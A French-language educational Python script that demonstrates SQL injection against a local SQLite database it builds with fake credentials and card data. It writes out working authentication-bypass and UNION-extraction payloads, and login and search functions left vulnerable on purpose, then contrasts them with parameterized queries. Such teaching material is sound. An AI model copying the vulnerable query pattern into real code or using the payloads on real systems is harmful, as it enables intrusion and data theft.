#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║              SQL INJECTION - DÉMONSTRATION ÉDUCATIVE             ║
║                                                                  ║
║  ⚠️  USAGE ÉDUCATIF - NE PAS UTILISER SUR DES SITES RÉELS ⚠️    ║
╚══════════════════════════════════════════════════════════════════╝
"""

import sqlite3
import os
import re

# Créer une base de données de test
DB_FILE = "vulnerable_app.db"

def setup_database():
    """Créer une base de données vulnérable pour les tests"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # Supprimer les tables existantes
    cursor.execute("DROP TABLE IF EXISTS users")
    cursor.execute("DROP TABLE IF EXISTS credit_cards")
    cursor.execute("DROP TABLE IF EXISTS messages")
    
    # Créer les tables
    cursor.execute("""
        CREATE TABLE users (
            id INTEGER PRIMARY KEY,
            username TEXT,
            password TEXT,
            email TEXT,
            role TEXT
        )
    """)
    
    cursor.execute("""
        CREATE TABLE credit_cards (
            id INTEGER PRIMARY KEY,
            user_id INTEGER,
            card_number TEXT,
            expiry TEXT,
            cvv TEXT
        )
    """)
    
    cursor.execute("""
        CREATE TABLE messages (
            id INTEGER PRIMARY KEY,
            sender TEXT,
            content TEXT,
            is_private INTEGER
        )
    """)
    
    # Insérer des données
    users = [
        ("admin", "SuperSecretAdmin123!", "admin@company.com", "admin"),
        ("jean", "jean2024", "jean@email.com", "user"),
        ("marie", "mariepass", "marie@email.com", "user"),
        ("hacker_target", "password123", "target@email.com", "user"),
    ]
    
    for u in users:
        cursor.execute("INSERT INTO users (username, password, email, role) VALUES (?, ?, ?, ?)", u)
    
    cards = [
        (1, "4532015112830366", "12/27", "123"),
        (2, "5425233430109903", "08/26", "456"),
        (4, "4916338506082832", "03/25", "789"),
    ]
    
    for c in cards:
        cursor.execute("INSERT INTO credit_cards (user_id, card_number, expiry, cvv) VALUES (?, ?, ?, ?)", c)
    
    messages = [
        ("admin", "Le mot de passe du serveur est: RootP@ss2024!", 1),
        ("jean", "Salut tout le monde!", 0),
        ("admin", "Backup credentials: backup_user / Bkp#Secret99", 1),
    ]
    
    for m in messages:
        cursor.execute("INSERT INTO messages (sender, content, is_private) VALUES (?, ?, ?)", m)
    
    conn.commit()
    conn.close()
    print("✅ Base de données de test créée!")

def vulnerable_login(username, password):
    """Fonction de login VULNÉRABLE (ne jamais faire ça!)"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # ⚠️ VULNÉRABLE - Concaténation directe!
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    
    print(f"\n📝 Requête SQL exécutée:")
    print(f"   {query}")
    print()
    
    try:
        cursor.execute(query)
        result = cursor.fetchone()
        conn.close()
        return result
    except sqlite3.Error as e:
        print(f"❌ Erreur SQL: {e}")
        conn.close()
        return None

def vulnerable_search(search_term):
    """Fonction de recherche VULNÉRABLE"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # ⚠️ VULNÉRABLE
    query = f"SELECT username, email FROM users WHERE username LIKE '%{search_term}%'"
    
    print(f"\n📝 Requête SQL exécutée:")
    print(f"   {query}")
    print()
    
    try:
        cursor.execute(query)
        results = cursor.fetchall()
        conn.close()
        return results
    except sqlite3.Error as e:
        print(f"❌ Erreur SQL: {e}")
        conn.close()
        return []

def secure_login(username, password):
    """Fonction de login SÉCURISÉE (paramètres préparés)"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # ✅ SÉCURISÉ - Paramètres préparés
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    
    print(f"\n📝 Requête SQL sécurisée:")
    print(f"   {query}")
    print(f"   Paramètres: [{username}, {password}]")
    print()
    
    cursor.execute(query, (username, password))
    result = cursor.fetchone()
    conn.close()
    return result

def demo_sql_injections():
    """Démontrer différents types d'injections SQL"""
    
    print("""
╔══════════════════════════════════════════════════════════════════╗
║              💉 DÉMONSTRATION SQL INJECTION                      ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    
    injections = [
        {
            "name": "Bypass d'authentification basique",
            "username": "admin",
            "password": "' OR '1'='1",
            "description": "Rend la condition toujours vraie"
        },
        {
            "name": "Bypass avec commentaire",
            "username": "admin'--",
            "password": "nimportequoi",
            "description": "Commente le reste de la requête"
        },
        {
            "name": "UNION - Extraire tous les utilisateurs",
            "username": "' UNION SELECT id, username, password, email, role FROM users--",
            "password": "",
            "description": "Combine avec une autre requête"
        },
        {
            "name": "Extraction de données sensibles",
            "username": "' UNION SELECT 1, card_number, cvv, expiry, '5' FROM credit_cards--",
            "password": "",
            "description": "Extrait les cartes bancaires!"
        },
    ]
    
    for i, inj in enumerate(injections, 1):
        print(f"\n{'='*60}")
        print(f"🎯 ATTAQUE #{i}: {inj['name']}")
        print(f"   {inj['description']}")
        print(f"{'='*60}")
        print(f"\n   Username: {inj['username']}")
        print(f"   Password: {inj['password']}")
        
        result = vulnerable_login(inj['username'], inj['password'])
        
        if result:
            print(f"   ✅ INJECTION RÉUSSIE!")
            print(f"   📊 Données récupérées: {result}")
        else:
            print(f"   ❌ Pas de résultat")
        
        input("\n   [Appuyez sur Entrée pour continuer...]")

def demo_union_extraction():
    """Démontrer l'extraction de données via UNION"""
    print("""
╔══════════════════════════════════════════════════════════════════╗
║              🔓 EXTRACTION DE DONNÉES VIA UNION                  ║
╚══════════════════════════════════════════════════════════════════╝

L'attaque UNION permet de combiner les résultats de plusieurs
requêtes pour extraire des données d'autres tables.
    """)
    
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # Simulation d'extraction
    print("\n📋 ÉTAPE 1: Déterminer le nombre de colonnes")
    print("   Requête: ' ORDER BY 1-- (puis 2, 3, 4... jusqu'à erreur)")
    
    print("\n📋 ÉTAPE 2: Trouver les colonnes affichables")
    print("   Requête: ' UNION SELECT 1,2,3,4,5--")
    
    print("\n📋 ÉTAPE 3: Extraire les noms de tables")
    query = "SELECT name FROM sqlite_master WHERE type='table'"
    cursor.execute(query)
    tables = cursor.fetchall()
    print(f"   Tables trouvées: {[t[0] for t in tables]}")
    
    print("\n📋 ÉTAPE 4: Extraire les données sensibles")
    
    print("\n   🔐 MOTS DE PASSE:")
    cursor.execute("SELECT username, password FROM users")
    for user, pwd in cursor.fetchall():
        print(f"      {user}: {pwd}")
    
    print("\n   💳 CARTES BANCAIRES:")
    cursor.execute("SELECT card_number, expiry, cvv FROM credit_cards")
    for card, exp, cvv in cursor.fetchall():
        print(f"      {card} | Exp: {exp} | CVV: {cvv}")
    
    print("\n   📧 MESSAGES PRIVÉS:")
    cursor.execute("SELECT sender, content FROM messages WHERE is_private = 1")
    for sender, content in cursor.fetchall():
        print(f"      [{sender}]: {content}")
    
    conn.close()

def main():
    print("""
╔══════════════════════════════════════════════════════════════════╗
║              💉 SQL INJECTION - DÉMONSTRATION                    ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  L'injection SQL exploite les failles dans les requêtes          ║
║  pour accéder ou modifier la base de données.                    ║
║                                                                  ║
║  🎯 CE QUE PEUT FAIRE UN HACKER:                                 ║
║     - Bypasser l'authentification                                ║
║     - Voler tous les mots de passe                               ║
║     - Extraire les données bancaires                             ║
║     - Modifier ou supprimer des données                          ║
║     - Prendre le contrôle du serveur (dans certains cas)         ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    
    # Créer la base de test
    setup_database()
    
    print("\n📋 OPTIONS:\n")
    print("   1. Démo: Bypass authentification")
    print("   2. Démo: Extraction de données (UNION)")
    print("   3. Tester une injection personnalisée")
    print("   4. Voir la différence code vulnérable vs sécurisé")
    print("   0. Quitter")
    
    choice = input("\n🎯 Votre choix: ").strip()
    
    if choice == "1":
        demo_sql_injections()
        
    elif choice == "2":
        demo_union_extraction()
        
    elif choice == "3":
        print("\n🧪 TEST D'INJECTION PERSONNALISÉE")
        print("-" * 50)
        username = input("Username: ")
        password = input("Password: ")
        
        result = vulnerable_login(username, password)
        if result:
            print(f"\n✅ Connexion réussie!")
            print(f"📊 Données: {result}")
        else:
            print("\n❌ Échec de connexion")
            
    elif choice == "4":
        print("\n📊 COMPARAISON CODE VULNÉRABLE VS SÉCURISÉ")
        print("=" * 60)
        
        print("""
❌ CODE VULNÉRABLE (ne jamais faire):
────────────────────────────────────────────────────────────
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)

🎯 ATTAQUE: username = "admin' OR '1'='1"
   Requête: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
   Résultat: Tous les utilisateurs sont retournés!


✅ CODE SÉCURISÉ (toujours utiliser):
────────────────────────────────────────────────────────────
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))

🎯 ATTAQUE: username = "admin' OR '1'='1"
   Requête: SELECT * FROM users WHERE username = "admin' OR '1'='1"
   Résultat: Cherche littéralement ce username (inexistant)
        """)
        
        # Test comparatif
        print("\n🧪 TEST EN DIRECT:")
        print("-" * 60)
        
        malicious = "admin' OR '1'='1"
        
        print(f"\nInjection: {malicious}")
        print("\n⚠️ Code vulnérable:")
        vuln_result = vulnerable_login(malicious, "")
        print(f"   Résultat: {vuln_result}")
        
        print("\n✅ Code sécurisé:")
        safe_result = secure_login(malicious, "")
        print(f"   Résultat: {safe_result}")
    
    print("\n" + "=" * 60)
    print("🛡️ COMMENT SE PROTÉGER:")
    print("=" * 60)
    print("""
   1. Toujours utiliser des requêtes paramétrées
   2. Valider et filtrer les entrées utilisateur
   3. Limiter les privilèges de l'utilisateur DB
   4. Utiliser un ORM (SQLAlchemy, Django ORM, etc.)
   5. Activer les WAF (Web Application Firewall)
   6. Ne jamais afficher les erreurs SQL en production
    """)
    
    # Nettoyer
    if os.path.exists(DB_FILE):
        os.remove(DB_FILE)
        print(f"\n🗑️ Base de données de test supprimée.")

if __name__ == "__main__":
    main()
